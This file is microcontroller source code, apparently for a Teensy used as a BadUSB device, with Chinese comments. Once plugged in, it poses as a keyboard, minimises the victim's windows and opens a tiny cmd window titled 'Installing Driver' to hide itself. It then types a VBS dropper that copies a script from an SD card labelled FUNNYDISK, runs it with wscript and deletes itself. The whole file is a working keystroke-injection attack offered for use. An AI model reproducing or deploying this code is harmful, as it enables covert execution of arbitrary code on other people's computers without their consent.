//此代码复制并运行sd卡中的一个vbs((你的sd卡盘符)H:\r\run.txt)run.txt是你的vbs代码
//sd卡label必须为funnydisk，自定义请自己修改代码

#include <usb_private.h>
const int led_pin = 6; 
//bool is_scroll_on(void) {return ((int(keyboard_leds)& 4) == 4) ? true : false;}
bool is_caps_on(void)   {return ((int(keyboard_leds)& 2) == 2) ? true : false;}
bool is_num_on(void)    {return ((int(keyboard_leds)& 1) == 1) ? true : false;}
void p(int t)
{
	Keyboard.set_key1((t>0)?KEY_NUM_LOCK:KEY_CAPS_LOCK);
	Keyboard.send_now();
	delay(100);
}
void blink_fast(int blinkrate,int delaytime)
{
	int blinkcounter=0;
	for(blinkcounter=0; blinkcounter!=blinkrate; blinkcounter++)
	{
		digitalWrite(led_pin, 1);
		delay(delaytime);
		digitalWrite(led_pin, 0);
		delay(delaytime);
	}
}

void unpress_key(void)
{
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(150);
}

void minimise_windows(void)
{
	Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
	Keyboard.set_key1(KEY_M);
	Keyboard.send_now();
	delay(300);
	unpress_key();
	delay(100);
}
void wait(unsigned int speed)
{
	bool numLockTrap = is_num_on();
	while(numLockTrap == is_num_on())
	{
		p(1);
                blink_fast(1,50);
		delay(speed);
    	}
	unpress_key();
	delay(speed);
}


void setup() {     
  usb_init();  
   wait(100);
   delay(2000);
   minimise_windows();
   minimise_windows();
   bool old_caps=is_caps_on();
   while(!is_caps_on()) p(0);
   Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
   Keyboard.set_key1(KEY_R);                                  
   Keyboard.send_now();                                          
   delay(200);                                                  
   Keyboard.println("cmd /T:32 /K \"mode con: cols=16 lines=1&mode con: delay=0&title Installing Driver\"");                                                                   
   delay(300);
   Keyboard.println("echo Set F=CreateObject(\"Scripting.FileSystemObject\")>%tmp%\\i.vbs");   
   Keyboard.println("echo o=F.getspecialfolder(2)^&\"\\run.vbs\">>%tmp%\\i.vbs");   
   Keyboard.println("echo For Each A in F.Drives>>%tmp%\\i.vbs");   
   Keyboard.println("echo If A.DriveType=1 Then>>%tmp%\\i.vbs");   
   Keyboard.println("echo if strcomp(A.volumename,\"FUNNYDISK\",1)=0 then>>%tmp%\\i.vbs");   
   Keyboard.println("echo F.getfile(A.driveletter^&\":\\\\r\\run.txt\").copy(o)>>%tmp%\\i.vbs");   
   Keyboard.println("echo createobject(\"wscript.shell\").exec \"wscript \"^&o>>%tmp%\\i.vbs");   
   Keyboard.println("echo exit for>>%tmp%\\i.vbs");   
   Keyboard.println("echo end if>>%tmp%\\i.vbs");   
   Keyboard.println("echo end if>>%tmp%\\i.vbs");   
   Keyboard.println("echo next>>%tmp%\\i.vbs");   
   Keyboard.println("echo F.DeleteFile(WScript.ScriptFullName)>>%tmp%\\i.vbs");   
   Keyboard.println("start wscript %tmp%\\i.vbs&exit");
   if (!old_caps) p(0);
   unpress_key();    
   blink_fast(3,80);   
   delay(300);
    }
void loop()
{
}
